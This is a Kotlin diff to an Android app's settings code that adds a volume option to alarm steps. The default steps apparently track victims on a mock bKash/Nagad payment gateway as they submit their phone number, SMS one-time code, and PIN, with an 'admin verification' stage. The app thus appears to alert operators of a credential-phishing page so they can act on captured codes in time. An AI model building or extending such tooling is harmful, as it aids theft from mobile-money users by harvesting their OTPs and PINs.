@@ -19,8 +19,11 @@ data class TongConfig(
     val subtitle: String,
     val isActive: Boolean,
     val type: AudioAlertManager.AlarmType,
-    val durationSeconds: Int = 10
-)
+    val durationSeconds: Int = 10,
+    val volumePercent: Int? = 100
+) {
+    fun getSafeVolume(): Int = volumePercent ?: 100
+}
  
 data class SettingsState(
     val baseUrl: String = "https://example.com",
@@ -120,26 +123,26 @@ class SettingsViewModel(application: Application) : AndroidViewModel(application
 
     private fun getDefaultTongs(): List<TongConfig> {
         return listOf(
-            TongConfig(0, "Step 0: Customer Enters Gateway", "Customers land on bKash/Nagad mock gateway page.", true, AudioAlertManager.AlarmType.SOFT_CHIME, 10),
-            TongConfig(1, "Step 1: Verification OTP Prompted", "Customer requests authentication code via SMS.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP, 12),
-            TongConfig(2, "Step 2: Credential PIN Submit", "Customer submits credentials/PIN details.", true, AudioAlertManager.AlarmType.PHONE_RINGTONE, 15),
-            TongConfig(3, "Step 3: Verification Processing", "Admin verification request pending cycle.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP, 10),
-            TongConfig(4, "Step 4: Transaction Successful 🎉", "Transaction completed and funds received.", true, AudioAlertManager.AlarmType.SOFT_CHIME, 10)
+            TongConfig(0, "ধাপ ০: কাস্টমার গেটওয়েতে প্রবেশ করেছেন", "Customer on landing page selecting method.", true, AudioAlertManager.AlarmType.SOFT_CHIME, 10, 100),
+            TongConfig(1, "ধাপ ১: কাস্টমার মোবাইল নম্বর দিচ্ছেন", "Customer is entering bkash/nagad phone number.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP, 12, 100),
+            TongConfig(2, "ধাপ ২: ওটিপি কোড চাওয়া হয়েছে", "Customer is entering verification code from SMS.", true, AudioAlertManager.AlarmType.PHONE_RINGTONE, 15, 100),
+            TongConfig(3, "ধাপ ৩: পিন কোড সাবমিট করা হয়েছে", "Customer is entering credit/PIN details.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP, 10, 100),
+            TongConfig(4, "ধাপ ৪: ভেরিফিকেশন সাকসেসফুল বা পেন্ডিং", "Transaction processed or waiting admin verification.", true, AudioAlertManager.AlarmType.SOFT_CHIME, 10, 100)
         )
     }
 
-    fun addTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType, durationSeconds: Int = 10) {
+    fun addTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType, durationSeconds: Int = 10, volumePercent: Int = 100) {
         val currentTongs = _state.value.tongs.toMutableList()
         currentTongs.removeAll { it.step == step }
-        currentTongs.add(TongConfig(step, title, subtitle, true, type, durationSeconds))
+        currentTongs.add(TongConfig(step, title, subtitle, true, type, durationSeconds, volumePercent))
         currentTongs.sortBy { it.step }
         saveTongsToPrefs(currentTongs)
     }
 
-    fun editTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType, durationSeconds: Int = 10) {
+    fun editTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType, durationSeconds: Int = 10, volumePercent: Int = 100) {
         val currentTongs = _state.value.tongs.map {
             if (it.step == step) {
-                it.copy(title = title, subtitle = subtitle, type = type, durationSeconds = durationSeconds)
+                it.copy(title = title, subtitle = subtitle, type = type, durationSeconds = durationSeconds, volumePercent = volumePercent)
             } else {
                 it
             }
